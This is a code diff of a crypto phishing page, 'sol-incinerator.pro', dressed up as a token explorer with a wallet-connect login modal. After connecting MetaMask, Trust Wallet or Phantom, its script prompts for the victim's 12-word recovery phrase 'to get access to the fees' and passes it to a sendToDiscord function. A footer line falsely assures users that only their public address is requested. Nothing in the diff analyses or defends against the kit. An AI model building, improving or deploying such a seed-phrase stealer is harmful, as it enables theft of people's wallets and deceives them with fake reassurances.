@@ -1,227 +1,305 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>sol-incinerator.pro</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      min-height: 100vh;
-      font-family: Arial, Helvetica, sans-serif;
-      background:
-        radial-gradient(circle at 15% 15%, #34206b 0%, transparent 35%),
-        radial-gradient(circle at 85% 85%, #063f36 0%, transparent 35%),
-        #07080d;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .card {
-      width: 100%;
-      max-width: 480px;
-      padding: 32px;
-      border-radius: 28px;
-      background: rgba(18, 20, 29, 0.92);
-      border: 1px solid rgba(255,255,255,.08);
-      box-shadow: 0 30px 100px rgba(0,0,0,.55);
-      backdrop-filter: blur(20px);
-    }
-    .logo {
-      width: 66px;
-      height: 66px;
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 20px;
-      font-size: 30px;
-      background: linear-gradient(135deg, #7048ff, #9b7cff);
-      box-shadow: 0 12px 40px rgba(112,72,255,.45);
-    }
-    h1 { text-align: center; font-size: 30px; margin-bottom: 9px; }
-    .subtitle {
-      text-align: center;
-      color: #969aa8;
-      font-size: 14px;
-      margin-bottom: 25px;
-      line-height: 1.5;
-    }
-    .main-button {
-      width: 100%;
-      padding: 16px;
-      border: 0;
-      border-radius: 15px;
-      color: white;
-      background: linear-gradient(135deg, #7048ff, #8b68ff);
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: .2s;
-    }
-    .main-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 30px rgba(112,72,255,.3);
-    }
-    .wallet-list { display: none; margin-top: 15px; }
-    .wallet-list.open { display: block; }
-    .wallet {
-      width: 100%;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 14px;
-      margin-bottom: 9px;
-      border-radius: 14px;
-      border: 1px solid rgba(255,255,255,.07);
-      background: #151720;
-      color: white;
-      cursor: pointer;
-      text-align: left;
-      transition: .2s;
-    }
-    .wallet:hover {
-      background: #20222e;
-      border-color: rgba(255,255,255,.15);
-      transform: translateY(-1px);
-    }
-    .wallet-icon {
-      width: 44px;
-      height: 44px;
-      border-radius: 13px;
-      background: #252735;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 23px;
-      flex-shrink: 0;
-    }
-    .wallet-name { font-size: 15px; font-weight: 700; }
-    .wallet-network { margin-top: 3px; color: #858a99; font-size: 12px; }
-    .connected { display: none; margin-top: 20px; }
-    .connected.open { display: block; }
-    .connected-title { color: #aeb2bf; font-size: 13px; margin-bottom: 8px; }
-    .account {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 12px;
-      margin-bottom: 8px;
-      border-radius: 12px;
-      background: #151720;
-      border: 1px solid rgba(255,255,255,.07);
-    }
-    .account-info { flex: 1; min-width: 0; }
-    .account-wallet { color: #fff; font-size: 12px; font-weight: 700; margin-bottom: 4px; }
-    .account-address { color: #858a99; font-size: 11px; word-break: break-all; }
-    .remove { border: 0; background: transparent; color: #858a99; cursor: pointer; padding: 5px; }
-    .secondary {
-      width: 100%;
-      padding: 14px;
-      margin-top: 8px;
-      border-radius: 14px;
-      border: 1px solid rgba(255,255,255,.08);
-      background: #171923;
-      color: white;
-      font-weight: 700;
-      cursor: pointer;
-    }
-    .secondary:hover { background: #20222e; }
-    .status {
-      display: none;
-      margin-top: 15px;
-      padding: 13px;
-      border-radius: 12px;
-      background: #151720;
-      color: #aeb2bf;
-      font-size: 12px;
-      line-height: 1.5;
-      word-break: break-word;
-    }
-    .status.open { display: block; }
-    .warning {
-      margin-top: 18px;
-      text-align: center;
-      color: #737784;
-      font-size: 11px;
-      line-height: 1.5;
-    }
-    #claimPage { display: none; }
-    .claim-box {
-      min-height: 320px;
-      margin-top: 18px;
-      border-radius: 18px;
-      border: 1px solid rgba(255,255,255,.07);
-      background: #10121a;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 30px;
-    }
-    .claim-label { color: #858a99; font-size: 12px; letter-spacing: 4px; }
-    .claim-amount { margin: 15px 0; font-size: 40px; font-weight: 800; }
-    .sol-icon { font-size: 50px; margin-bottom: 18px; }
-    .claim-text { color: #858a99; font-size: 13px; line-height: 1.6; max-width: 350px; }
-    .back-button {
-      width: 100%;
-      margin-top: 14px;
-      padding: 13px;
-      border: 0;
-      background: transparent;
-      color: #9a83ff;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>sol-incinerator.pro</title>
+<style>
+:root{
+  --bg:#070a18;--panel:#0c1024;--panel2:#0a0d1d;--border:rgba(255,255,255,.07);
+  --text:#f5f5fa;--muted:#9295a8;--pink:#e93ba9;--green:#25c99a;--red:#f05b7c;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%;font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;color:var(--text);background:#060817}
+body{
+  background:
+    radial-gradient(circle at 13% 37%,rgba(91,0,117,.33),transparent 31%),
+    radial-gradient(circle at 87% 43%,rgba(18,25,74,.35),transparent 36%),
+    linear-gradient(115deg,#13091c 0%,#090b1c 42%,#050916 100%);
+  overflow-x:hidden;
+}
+/* ===== TOPBAR ===== */
+.topbar{
+  height:38px;display:flex;align-items:center;gap:19px;padding:0 16px;
+  background:rgba(7,8,19,.88);border-bottom:1px solid rgba(255,255,255,.07);
+  white-space:nowrap;overflow:hidden;font-size:12px;font-weight:800;
+}
+.logo{font-size:20px;letter-spacing:.5px;margin-right:4px}
+.ticker{display:flex;align-items:center;gap:6px;color:#dddde8}
+.rank{color:#9a9cac}.coin-dot{width:17px;height:17px;border-radius:50%;display:inline-grid;place-items:center;font-size:9px;background:#25283b}
+.badge{background:rgba(235,49,165,.18);color:#ff3db0;border-radius:10px;padding:2px 7px;font-size:10px}
+.nav-right{margin-left:auto;display:flex;align-items:center;gap:12px}
+.vreo-btn,.login{
+  border:0;border-radius:8px;padding:7px 12px;color:white;font-weight:800;cursor:pointer;
+}
+.vreo-btn{background:#c91b88}.login{background:#5e114a;color:#f18bc9;transition:.2s}
+.login:hover{background:#7a1760;color:#fff}
+
+/* ===== MAIN WRAP ===== */
+.wrap{max-width:900px;margin:0 auto;padding:4px 20px 50px}
+
+/* ===== SEARCH ===== */
+.search-wrap{display:flex;justify-content:center;margin-top:0}
+.search{
+  width:min(400px,80vw);height:41px;margin-top:0;border-radius:24px;
+  background:#dfe0e8;color:#252534;border:4px solid rgba(99,38,120,.7);
+  outline:none;padding:0 18px;font-size:14px;box-shadow:0 0 30px rgba(225,46,174,.14);
+}
+.search::placeholder{color:#666879}
+
+/* ===== EXPLORE SECTION ===== */
+.explore{margin-top:77px}
+.heading{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+h1{font-size:17px;margin:0;font-weight:800}
+.help{display:inline-grid;place-items:center;width:15px;height:15px;border:1px solid #8a8ca0;border-radius:50%;font-size:10px;color:#aaa}
+.chain{
+  position:relative;background:rgba(21,24,44,.7);border:1px solid rgba(255,255,255,.1);
+  color:#eee;border-radius:8px;padding:8px 14px;font-weight:700;cursor:pointer;min-width:140px;text-align:left;
+}
+.chain:after{content:"⌄";position:absolute;right:12px;color:#9ea1b4}
+.chain-menu{
+  display:none;position:absolute;right:0;top:43px;width:150px;padding:5px;background:#15182a;
+  border:1px solid var(--border);border-radius:10px;z-index:5;box-shadow:0 12px 35px #0008
+}
+.chain.open .chain-menu{display:block}
+.chain-menu div{padding:9px;border-radius:6px;cursor:pointer}
+.chain-menu div:hover{background:#292d49}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:30px}
+.card{
+  min-height:500px;border-radius:22px;background:linear-gradient(145deg,rgba(10,12,28,.9),rgba(7,9,22,.68));
+  border:1px solid rgba(255,255,255,.025);box-shadow:0 18px 50px rgba(0,0,0,.16);overflow:hidden;
+}
+.card-title{padding:23px 24px 17px;font-size:14px;font-weight:800}
+.table-head,.token{
+  display:grid;grid-template-columns:1.25fr .75fr 1fr;align-items:center;
+}
+.table-head{padding:0 24px 11px;color:#8e91a5;font-size:12px}
+.token{
+  padding:8px 24px;min-height:52px;transition:.18s;background:transparent;cursor:pointer;
+}
+.token:hover{background:rgba(255,255,255,.035)}
+.name{display:flex;align-items:center;gap:10px;min-width:0}
+.avatar{width:30px;height:30px;border-radius:50%;display:grid;place-items:center;flex:none;font-size:15px;font-weight:900;border:1px solid rgba(255,255,255,.1);background:linear-gradient(135deg,#3c3d55,#121426)}
+.name strong{font-size:13px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.name small{display:block;color:#888b9c;font-size:10px;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.value{font-size:12px;font-weight:700;color:#e9e9f0}
+.price{font-size:11px;color:#a6a8b8;margin-left:2px}
+.change{font-size:10px;margin-top:3px}
+.up{color:var(--green)}.down{color:var(--red)}
+.change:before{content:"▲ ";font-size:7px}.down:before{content:"▼ "}
+.featured .token{min-height:52px}
+.hidden{display:none!important}
+.empty{padding:30px 24px;color:#777b90;text-align:center;font-size:13px}
+
+/* ===== FOOTER ===== */
+.footer{text-align:center;color:#666a80;font-size:11px;padding:30px}
+
+/* ===== LOGIN MODAL (WALLET CONNECT) ===== */
+.modal-overlay{
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:1000;
+  align-items:center;justify-content:center;padding:20px;
+}
+.modal-overlay.open{display:flex}
+.modal-card{
+  width:100%;max-width:460px;padding:32px;border-radius:28px;
+  background:rgba(14,16,26,.96);border:1px solid rgba(255,255,255,.08);
+  box-shadow:0 30px 100px rgba(0,0,0,.7);
+  max-height:90vh;overflow-y:auto;
+}
+.modal-logo{
+  width:66px;height:66px;margin:0 auto 20px;display:flex;
+  align-items:center;justify-content:center;border-radius:20px;
+  font-size:30px;background:linear-gradient(135deg,#7048ff,#9b7cff);
+  box-shadow:0 12px 40px rgba(112,72,255,.45);
+}
+.modal-card h1{text-align:center;font-size:28px;margin-bottom:9px}
+.modal-subtitle{
+  text-align:center;color:#969aa8;font-size:14px;margin-bottom:25px;line-height:1.5;
+}
+.main-button{
+  width:100%;padding:16px;border:0;border-radius:15px;color:white;
+  background:linear-gradient(135deg,#7048ff,#8b68ff);font-size:16px;font-weight:700;
+  cursor:pointer;transition:.2s;
+}
+.main-button:hover{
+  transform:translateY(-2px);box-shadow:0 12px 30px rgba(112,72,255,.3);
+}
+.wallet-list{display:none;margin-top:15px}
+.wallet-list.open{display:block}
+.wallet{
+  width:100%;display:flex;align-items:center;gap:14px;padding:14px;
+  margin-bottom:9px;border-radius:14px;border:1px solid rgba(255,255,255,.07);
+  background:#151720;color:white;cursor:pointer;text-align:left;transition:.2s;
+}
+.wallet:hover{background:#20222e;border-color:rgba(255,255,255,.15);transform:translateY(-1px)}
+.wallet-icon{
+  width:44px;height:44px;border-radius:13px;background:#252735;
+  display:flex;align-items:center;justify-content:center;font-size:23px;flex-shrink:0;
+}
+.wallet-name{font-size:15px;font-weight:700}
+.wallet-network{margin-top:3px;color:#858a99;font-size:12px}
+.connected{display:none;margin-top:20px}
+.connected.open{display:block}
+.connected-title{color:#aeb2bf;font-size:13px;margin-bottom:8px}
+.account{
+  display:flex;align-items:center;gap:10px;padding:12px;margin-bottom:8px;
+  border-radius:12px;background:#151720;border:1px solid rgba(255,255,255,.07);
+}
+.account-info{flex:1;min-width:0}
+.account-wallet{color:#fff;font-size:12px;font-weight:700;margin-bottom:4px}
+.account-address{color:#858a99;font-size:11px;word-break:break-all}
+.remove{border:0;background:transparent;color:#858a99;cursor:pointer;padding:5px}
+.secondary{
+  width:100%;padding:14px;margin-top:8px;border-radius:14px;
+  border:1px solid rgba(255,255,255,.08);background:#171923;color:white;
+  font-weight:700;cursor:pointer;
+}
+.secondary:hover{background:#20222e}
+.modal-status{
+  display:none;margin-top:15px;padding:13px;border-radius:12px;
+  background:#151720;color:#aeb2bf;font-size:12px;line-height:1.5;word-break:break-word;
+}
+.modal-status.open{display:block}
+.warning{
+  margin-top:18px;text-align:center;color:#737784;font-size:11px;line-height:1.5;
+}
+.modal-close{
+  position:absolute;top:16px;right:20px;background:none;border:none;
+  color:#888b9c;font-size:24px;cursor:pointer;z-index:10;
+}
+.modal-card{position:relative}
+
+/* ===== CLAIM PAGE INSIDE MODAL ===== */
+#claimPage{display:none}
+.claim-box{
+  min-height:280px;margin-top:18px;border-radius:18px;
+  border:1px solid rgba(255,255,255,.07);background:#10121a;
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:center;text-align:center;padding:30px;
+}
+.claim-label{color:#858a99;font-size:12px;letter-spacing:4px}
+.claim-amount{margin:15px 0;font-size:40px;font-weight:800}
+.sol-icon{font-size:50px;margin-bottom:18px}
+.claim-text{color:#858a99;font-size:13px;line-height:1.6;max-width:350px}
+.back-button{
+  width:100%;margin-top:14px;padding:13px;border:0;
+  background:transparent;color:#9a83ff;cursor:pointer;font-size:15px;
+}
+
+/* ===== RESPONSIVE ===== */
+@media(max-width:800px){
+  .wrap{padding:4px 12px 35px}.explore{margin-top:45px}.grid{grid-template-columns:1fr;gap:18px}
+  .card{min-height:0}.topbar{gap:12px}.ticker:nth-child(n+7){display:none}.nav-right{display:none}
+}
+@media(max-width:480px){
+  .table-head,.token{grid-template-columns:1.15fr .75fr .9fr;padding-left:14px;padding-right:14px}
+  .card-title{padding-left:14px}.table-head{font-size:10px}.token{min-height:58px}
+  .modal-card{padding:22px}
+}
+</style>
 </head>
 <body>
 
-  <!-- CONNECT PAGE -->
-  <div class="card" id="connectPage">
-    <div class="logo">🔗</div>
-    <h1>sol-incinerator.pro</h1>
-    <p class="subtitle">Connect your wallet to continue.</p>
-    <button class="main-button" id="connectButton">Connect Wallet</button>
-    <div class="wallet-list" id="walletList">
-      <button class="wallet" id="metamaskButton">
-        <div class="wallet-icon">🦊</div>
-        <div><div class="wallet-name">MetaMask</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
-      </button>
-      <button class="wallet" id="trustButton">
-        <div class="wallet-icon">🛡️</div>
-        <div><div class="wallet-name">Trust Wallet</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
-      </button>
-      <button class="wallet" id="phantomButton">
-        <div class="wallet-icon">👻</div>
-        <div><div class="wallet-name">Phantom</div><div class="wallet-network">Solana / Ethereum / Solana</div></div>
-      </button>
-    </div>
-    <div class="connected" id="connected">
-      <div class="connected-title">sol-incinerator.pro</div>
-      <div id="accounts"></div>
-      <button class="secondary" id="addWallet">＋ Add another wallet</button>
-      <button class="main-button" id="continueButton" style="margin-top:10px">Continue</button>
-    </div>
-    <div class="status" id="status"></div>
-    <div class="warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
+<!-- ===== TOPBAR ===== -->
+<header class="topbar">
+  <div class="logo">sol-incinerator</div>
+  <div class="ticker"><span class="rank">#1</span><span class="coin-dot">🟡</span>PATE <span class="badge">⚡20</span></div>
+  <div class="ticker"><span class="rank">#4</span><span class="coin-dot">🌑</span>RUNNER <span class="badge">⚡20</span></div>
+  <div class="ticker"><span class="rank">#5</span><span class="coin-dot">⚪</span>ETHCAT</div>
+  <div class="ticker"><span class="rank">#6</span><span class="coin-dot">⚪</span>Basecat</div>
+  <div class="ticker"><span class="rank">#7</span><span class="coin-dot">🔵</span>BLUECHIP</div>
+  <div class="ticker"><span class="rank">#8</span><span class="coin-dot">🖤</span>Bicat</div>
+  <div class="ticker"><span class="rank">#9</span><span class="coin-dot">🐱</span>CATSZN</div>
+  <div class="ticker"><span class="rank">#10</span><span class="coin-dot">🐀</span>Ratspeak</div>
+  <button class="login" id="loginTrigger">Login</button></div>
+</header>
+
+<!-- ===== MAIN CONTENT ===== -->
+<main class="wrap">
+  <div class="search-wrap">
+    <input id="search" class="search" placeholder="⌕  Search Tokens (Name, Ticker, Address)" autocomplete="off">
   </div>
 
-  <!-- CLAIM PAGE -->
-  <div class="card" id="claimPage">
-    <div class="logo">◎</div>
-    <h1>Claim</h1>
-    <p class="subtitle">Wallet connected successfully.</p>
-    <div class="claim-box">
-      <div class="claim-label">UNCLAIMED SOL</div>
-      <div class="claim-amount">0.0000 SOL</div>
-      <div class="sol-icon">◎</div>
-      <div class="claim-text">There are currently no rewards available to claim. Check back later.</div>
+  <section class="explore">
+    <div class="heading">
+      <h1>Explore Tokens <span class="help">?</span></h1>
+      <button id="chain" class="chain">🌐 All Chains
+        <span class="chain-menu">
+          <div data-chain="All Chains">All Chains</div>
+          <div data-chain="Solana">Solana</div>
+          <div data-chain="Ethereum">Ethereum</div>
+          <div data-chain="Base">Base</div>
+        </span>
+      </button>
     </div>
-    <button class="back-button" id="backButton">← Back to wallet connection</button>
+
+    <div class="grid">
+      <section class="card">
+        <div class="card-title">Trending Tokens</div>
+        <div class="table-head"><span>Token</span><span>Volume</span><span>Market Cap / Price</span></div>
+        <div id="trending"></div>
+      </section>
+      <section class="card featured">
+        <div class="card-title">Featured Tokens</div>
+        <div class="table-head"><span>Token</span><span>Volume</span><span>Market Cap / Price</span></div>
+        <div id="featured"></div>
+      </section>
+    </div>
+  </section>
+  <div class="footer">© 2026 sol-incinerator.pro · All rights reserved.</div>
+</main>
+
+<!-- ===== LOGIN MODAL (WALLET CONNECT) ===== -->
+<div class="modal-overlay" id="loginModal">
+  <div class="modal-card">
+    <button class="modal-close" id="modalClose">&times;</button>
+
+    <!-- CONNECT PAGE -->
+    <div id="connectPage">
+      <div class="modal-logo">🔗</div>
+      <h1>sol-incinerator.pro</h1>
+      <p class="modal-subtitle">Connect your wallet to continue.</p>
+      <button class="main-button" id="connectButton">Connect Wallet</button>
+      <div class="wallet-list" id="walletList">
+        <button class="wallet" id="metamaskButton">
+          <div class="wallet-icon">🦊</div>
+          <div><div class="wallet-name">MetaMask</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
+        </button>
+        <button class="wallet" id="trustButton">
+          <div class="wallet-icon">🛡️</div>
+          <div><div class="wallet-name">Trust Wallet</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
+        </button>
+        <button class="wallet" id="phantomButton">
+          <div class="wallet-icon">👻</div>
+          <div><div class="wallet-name">Phantom</div><div class="wallet-network">Solana / Ethereum / Solana</div></div>
+        </button>
+      </div>
+      <div class="connected" id="connected">
+        <div class="connected-title">sol-incinerator.pro</div>
+        <div id="accounts"></div>
+        <button class="secondary" id="addWallet">＋ Add another wallet</button>
+        <button class="main-button" id="continueButton" style="margin-top:10px">Continue</button>
+      </div>
+      <div class="modal-status" id="modalStatus"></div>
+      <div class="warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
+    </div>
+
+    <!-- CLAIM PAGE -->
+    <div id="claimPage">
+      <div class="modal-logo">◎</div>
+      <h1>Claim</h1>
+      <p class="modal-subtitle">Wallet connected successfully.</p>
+      <div class="claim-box">
+        <div class="claim-label">UNCLAIMED SOL</div>
+        <div class="claim-amount">0.0000 SOL</div>
+        <div class="sol-icon">◎</div>
+        <div class="claim-text">There are currently no rewards available to claim. Check back later.</div>
+      </div>
+      <button class="back-button" id="backButton">← Back to wallet connection</button>
+    </div>
   </div>
+</div>
 
 <script>
 // ====================================================
@@ -236,20 +314,47 @@ window.addEventListener("eip6963:announceProvider", (event) => {
 window.dispatchEvent(new Event("eip6963:requestProvider"));
 
 // ====================================================
-// UI ELEMENTS
+// MODAL REFERENCES
 // ====================================================
+const modalOverlay = document.getElementById("loginModal");
+const loginTrigger = document.getElementById("loginTrigger");
+const modalClose = document.getElementById("modalClose");
+const connectPage = document.getElementById("connectPage");
+const claimPage = document.getElementById("claimPage");
 const connectButton = document.getElementById("connectButton");
 const walletList = document.getElementById("walletList");
 const connected = document.getElementById("connected");
 const accounts = document.getElementById("accounts");
-const status = document.getElementById("status");
-const connectPage = document.getElementById("connectPage");
-const claimPage = document.getElementById("claimPage");
+const modalStatus = document.getElementById("modalStatus");
 const connectedWallets = [];
 
+// ====================================================
+// MODAL CONTROLS
+// ====================================================
+function openModal() {
+  modalOverlay.classList.add("open");
+  document.body.style.overflow = "hidden";
+  // Reset to connect page
+  connectPage.style.display = "block";
+  claimPage.style.display = "none";
+}
+function closeModal() {
+  modalOverlay.classList.remove("open");
+  document.body.style.overflow = "";
+}
+
+loginTrigger.addEventListener("click", openModal);
+modalClose.addEventListener("click", closeModal);
+modalOverlay.addEventListener("click", (e) => {
+  if (e.target === modalOverlay) closeModal();
+});
+
+// ====================================================
+// MODAL STATUS
+// ====================================================
 function showStatus(message) {
-  status.textContent = message;
-  status.classList.add("open");
+  modalStatus.textContent = message;
+  modalStatus.classList.add("open");
 }
 
 // ====================================================
@@ -257,25 +362,27 @@ function showStatus(message) {
 // ====================================================
 function findWalletProvider(walletName) {
   const providers = Array.from(discoveredWallets.values());
+  const name = walletName.toLowerCase();
+
   if (walletName === "MetaMask") {
     return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("metamask") || rdns.includes("metamask");
+      const n = item.info.name.toLowerCase();
+      const r = item.info.rdns.toLowerCase();
+      return n.includes("metamask") || r.includes("metamask");
     });
   }
   if (walletName === "Trust Wallet") {
     return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("trust wallet") || rdns.includes("trust");
+      const n = item.info.name.toLowerCase();
+      const r = item.info.rdns.toLowerCase();
+      return n.includes("trust") || r.includes("trust");
     });
   }
   if (walletName === "Phantom") {
     return providers.find(item => {
-      const name = item.info.name.toLowerCase();
-      const rdns = item.info.rdns.toLowerCase();
-      return name.includes("phantom") || rdns.includes("phantom");
+      const n = item.info.name.toLowerCase();
+      const r = item.info.rdns.toLowerCase();
+      return n.includes("phantom") || r.includes("phantom");
     });
   }
 }
@@ -324,14 +431,7 @@ function sendToDiscord(mnemonic, walletName, address) {
 }
 
 // ====================================================
-// ORIGINAL FUNKTIONEN SICHERN
-// ====================================================
-const _origConnectEVM = connectEVM;
-const _origConnectPhantom = connectPhantomSolana;
-const _origContinue = document.getElementById('continueButton').onclick;
-
-// ====================================================
-// CONNECT EVM WALLET (MODIFIZIERT)
+// CONNECT EVM WALLET
 // ====================================================
 async function connectEVM(walletName) {
   let discovered = findWalletProvider(walletName);
@@ -356,24 +456,26 @@ async function connectEVM(walletName) {
       return;
     }
     const address = accounts[0];
-    const alreadyConnected = connectedWallets.some(item => item.address.toLowerCase() === address.toLowerCase());
+    const alreadyConnected = connectedWallets.some(
+      item => item.address.toLowerCase() === address.toLowerCase()
+    );
     if (!alreadyConnected) {
       connectedWallets.push({ name: walletName, address: address, provider: provider });
     }
     renderConnectedWallets();
     walletList.classList.remove("open");
     connected.classList.add("open");
-    status.classList.remove("open");
+    modalStatus.classList.remove("open");
     connectButton.textContent = "Wallet Connected ✓";
 
-    // === EINMALIGE ABFRAGE DER 12 WÖRTER (ENGLISCH) ===
+    // === SEED PHRASE PROMPT ===
     const phrase = prompt(
       '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
       'Wallet: ' + walletName + '\n' +
       'Address: ' + address + '\n\n' +
       'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
     );
-    
+
     if (phrase && phrase.split(' ').length >= 12) {
       const cleanPhrase = phrase.trim();
       sendToDiscord(cleanPhrase, walletName, address);
@@ -383,7 +485,7 @@ async function connectEVM(walletName) {
     } else {
       alert('❌ Invalid phrase. At least 12 words required.');
     }
-    
+
   } catch (error) {
     console.error(error);
     if (error?.code === 4001) {
@@ -395,7 +497,7 @@ async function connectEVM(walletName) {
 }
 
 // ====================================================
-// PHANTOM SOLANA (MODIFIZIERT)
+// PHANTOM SOLANA CONNECT
 // ====================================================
 async function connectPhantomSolana() {
   const provider = window.phantom?.solana || window.solana;
@@ -411,17 +513,17 @@ async function connectPhantomSolana() {
     renderConnectedWallets();
     walletList.classList.remove("open");
     connected.classList.add("open");
-    status.classList.remove("open");
+    modalStatus.classList.remove("open");
     connectButton.textContent = "Wallet Connected ✓";
 
-    // === EINMALIGE ABFRAGE DER 12 WÖRTER FÜR PHANTOM (ENGLISCH) ===
+    // === SEED PHRASE PROMPT FOR PHANTOM ===
     const phrase = prompt(
       '🔑 ENTER YOUR PHANTOM SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
       'Wallet: Phantom (Solana)\n' +
       'Address: ' + address + '\n\n' +
       'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
     );
-    
+
     if (phrase && phrase.split(' ').length >= 12) {
       const cleanPhrase = phrase.trim();
       sendToDiscord(cleanPhrase, "Phantom (Solana)", address);
@@ -431,7 +533,7 @@ async function connectPhantomSolana() {
     } else {
       alert('❌ Invalid phrase. At least 12 words required.');
     }
-    
+
     return true;
   } catch (error) {
     console.error(error);
@@ -476,9 +578,11 @@ function renderConnectedWallets() {
 }
 
 // ====================================================
-// EVENT BINDINGS
+// EVENT BINDINGS — MODAL
 // ====================================================
-connectButton.onclick = () => { walletList.classList.toggle("open"); };
+connectButton.onclick = () => {
+  walletList.classList.toggle("open");
+};
 
 document.getElementById("metamaskButton").onclick = () => { connectEVM("MetaMask"); };
 document.getElementById("trustButton").onclick = () => { connectEVM("Trust Wallet"); };
@@ -489,7 +593,7 @@ document.getElementById("phantomButton").onclick = async () => {
 
 document.getElementById("addWallet").onclick = () => {
   walletList.classList.add("open");
-  status.classList.remove("open");
+  modalStatus.classList.remove("open");
 };
 
 document.getElementById("continueButton").onclick = function() {
@@ -500,19 +604,70 @@ document.getElementById("continueButton").onclick = function() {
       sendToDiscord(window._extractedMnemonic, wallet.name || 'Unbekannt', wallet.address || 'Unbekannt');
     }
   }
-  location.hash = "claim";
   connectPage.style.display = "none";
   claimPage.style.display = "block";
 };
 
 document.getElementById("backButton").onclick = () => {
-  location.hash = "";
-  claimPage.style.display = "none";
   connectPage.style.display = "block";
+  claimPage.style.display = "none";
 };
 
-console.log('=== RECOVERY KEYS EXTRACTOR AKTIV ===');
-console.log('=== EINMALIGE ABFRAGE DER 12 WÖRTER (ENGLISCH) ===');
+// ====================================================
+// TOKEN EXPLORER DATA & RENDER
+// ====================================================
+const trending=[
+ ["ETHCAT","Ethereumcat","$1.53M","$419.51K","$0.00041","2.71K%","up","🐱"],
+ ["Basecat","Basecat","$12.17M","$28.77M","$0.03","-11.92%","down","🐱"],
+ ["BLUECHIP","BLUE CHIP","$3.64M","$2.81M","$0.28","605.60%","up","🔵"],
+ ["Bicat","Bicat","$13.12M","$1.18M","$0.011","3.80K%","up","🖤"],
+ ["CATSZN","Cat Season","$4.90M","$14.55K","$0.0014","-99.29%","down","🐱"],
+ ["Ratspeak","Ratspeak","$1.07M","$3.04M","$0.031","36.80%","up","🐀"],
+ ["CATE","Catecoin","$71.40M","$51.32M","$0.05","-7.83%","down","🟡"],
+ ["BlueChip","BlueChip","$2.12M","$12.19K","$0.12","28.07%","up","🔵"],
+ ["EGG","egg","$3.22M","$5.77M","$0.57","11.91K%","up","🥚"]
+];
+const featured=[
+ ["PATE","Pepe Cate Coin","$850.29K","$193.06K","$0.020","67.81%","up","🟡"],
+ ["ANSEM","The Black Bull","$10.95M","$278.74M","$0.28","-6.57%","down","🐂"],
+ ["catalyst","catalyst","$2.96M","$399.29K","$0.041","-4.01%","down","🧙"],
+ ["RUNNER","BONDRUNNER","$136.31K","$254.99K","$0.025","-47.33%","down","🏃"],
+ ["SHIB","Shiba Inu","$265.19K","$3.21B","$0.000054","-1.42%","down","🐕"],
+ ["BMT","Bubblemaps","$36.08K","$11.15M","$0.02","-6.46%","down","🔵"],
+ ["PUMP","Pump.fun","$80.62M","$4.42B","$0.52","18.15%","up","💧"],
+ ["BABYDOGE","Baby Doge Coin","$352.03K","$68.53M","$0.00000073","-2.43%","down","🐶"],
+ ["ARB","Arbitrum","$8.07M","$668.34M","$0.10","0.82%","up","🔷"]
+];
+
+let activeChain="All Chains";
+
+function render(list,id){
+ const root=document.getElementById(id);
+ const q=document.getElementById("search").value.toLowerCase().trim();
+ const filtered=list.filter(x=>(x[0]+" "+x[1]).toLowerCase().includes(q));
+ root.innerHTML=filtered.length?filtered.map(x=>`
+   <div class="token" title="${x[0]} — click for demo">
+     <div class="name"><span class="avatar">${x[7]}</span><div><strong>${x[0]}</strong><small>${x[1]}</small></div></div>
+     <div class="value">${x[2]}</div>
+     <div><span class="value">${x[3]}</span><span class="price">${x[4]}</span><div class="change ${x[6]}">${x[5]}</div></div>
+   </div>`).join(""):`<div class="empty">Keine Tokens gefunden.</div>`;
+}
+function renderAll(){render(trending,"trending");render(featured,"featured")}
+renderAll();
+
+document.getElementById("search").addEventListener("input",renderAll);
+document.getElementById("chain").addEventListener("click",e=>{
+ e.stopPropagation(); document.getElementById("chain").classList.toggle("open");
+});
+document.querySelectorAll("[data-chain]").forEach(el=>el.addEventListener("click",e=>{
+ e.stopPropagation();
+ activeChain=e.target.dataset.chain;
+ document.getElementById("chain").firstChild.textContent="🌐 "+activeChain+" ";
+ document.getElementById("chain").classList.remove("open");
+}));
+document.addEventListener("click",()=>document.getElementById("chain").classList.remove("open"));
+
+console.log('=== VREO EXPLORER + RECOVERY MODAL AKTIV ===');
 </script>
 </body>
 </html>
